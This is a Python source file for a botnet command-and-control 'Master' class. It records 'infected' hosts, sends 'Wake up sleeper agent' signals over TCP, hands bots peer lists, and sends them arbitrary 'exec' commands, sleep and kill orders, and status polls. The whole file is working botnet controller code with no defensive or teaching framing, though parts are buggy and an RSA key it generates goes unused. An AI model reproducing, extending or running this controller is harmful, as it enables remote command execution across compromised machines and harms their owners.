from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
import socket
import sys
import random

class Master:

    def __init__(self):
        self.port = 42345
        self.bootstrap_list = {}
        self.random = set()
        self.private_key = rsa.generate_private_key(
                                public_exponent=65537,
                                key_size=2048,
                                backend=default_backend()
                                )
        self.public_key = self.private_key.public_key()


    def infect(self, ip_addr):
        self.bootstrap_list[ip_addr] = 0

    def topology(self, ip):
        print("#########################")
        if ip ==  None:
            print("#### Botnet Topology ####")
            print("#########################")
            for host in self.bootstrap_list.keys():
                print("{} is connected to {}".format(host, self.show_neighbors(host)))
        else:
            print("### {} Topology ###".format(ip))
            print("#########################")
            print("{} is connected to {}".format(ip, self.show_neighbors(ip)))



    def build_host_list(self, ip_addr):
        avail_hosts = []
        for host in self.bootstrap_list:
            if self.bootstrap_list[host] == 1 and host != ip_addr:
                avail_hosts.append(host)
        if len(avail_hosts) == 1:
            return avail_hosts[0]
        elif len(avail_hosts) >= 2:
            ran_indexes = random.sample(range(0, len(avail_hosts)), 2)
            result = avail_hosts[ran_indexes[0]-1] + " " + avail_hosts[ran_indexes[1]-1]
            return result #' '.join(avail_hosts[len(avail_hosts)-2:])
        else:
            return None


    def bootstrap(self, ip_addr):
        host = ip_addr
        port = self.port
        wakeupCall = "Wake up sleeper agent".encode()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(wakeupCall)
                response = s.recv(1024)
                print(response.decode())
                hosts = self.build_host_list(ip_addr)
                print(hosts)
                if hosts != None:
                    s.send(hosts.encode())
                s.close()
        except socket.error or ConnectionRefusedError or ConnectionError as e:
            print ("Error reaching out to host {}".format(ip_addr))
            print(e)
            pass
        self.bootstrap_list[ip_addr] = 1  # added host to local list

    def sleep(self, ip_addr):
        sleepCall = "Go back to sleep"
        self.send(sleepCall, ip_addr)
        self.bootstrap_list[ip_addr] = 0  # added host to local list

    def execute(self, command, ip_addr):
        while True:
            random = self.__gen_random()
            if random not in self.random:
                break
        self.random.add(random)
        command = str(random) + ' ' + 'exec ' + command
        self.send(command, ip_addr)

    def kill(self, ip_addr):
        sigkill = "Kill bot"
        self.send(sigkill, ip_addr)
        del self.bootstrap_list[ip_addr]

    def send(self, cmd, ip_addr):
        host = ip_addr
        port = self.port
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(cmd.encode())
                response = s.recv(1024)
                print(response.decode())
                s.close()
        except socket.error or ConnectionRefusedError or ConnectionError as e:
            print("Error reaching out to host {}".format(ip_addr))
            print(e)
            pass


    def show_neighbors(self, host):
        cmd = "Show Neighbors"
        port = self.port
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(cmd.encode())
                response = s.recv(1024)
                s.close()
                return response.decode().split(' ')
        except socket.error or ConnectionRefusedError or ConnectionError as e:
            print("Error reaching out to host {}".format(host))
            print(e)
            pass


    def update(self):
        print("Updating Botnet Status")
        for host in self.bootstrap_list.keys():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, self.port))
                    s.sendall("Update Request".encode())
                    response = s.recv(1024)
                    if response.decode() == 'False':
                        self.bootstrap_list[host] = 1
                    elif response.decode() == 'True':
                        self.bootstrap_list[host] = 0
                    s.close()
            except socket.error or ConnectionRefusedError or ConnectionError as e:
                print("Error reaching out to host {}".format(host))
                print(e)
                self.bootstrap_list[host] = -1
                pass
        print("Done Updating")

    @staticmethod
    def __gen_random():
        return random.randint(0, sys.maxsize)

    
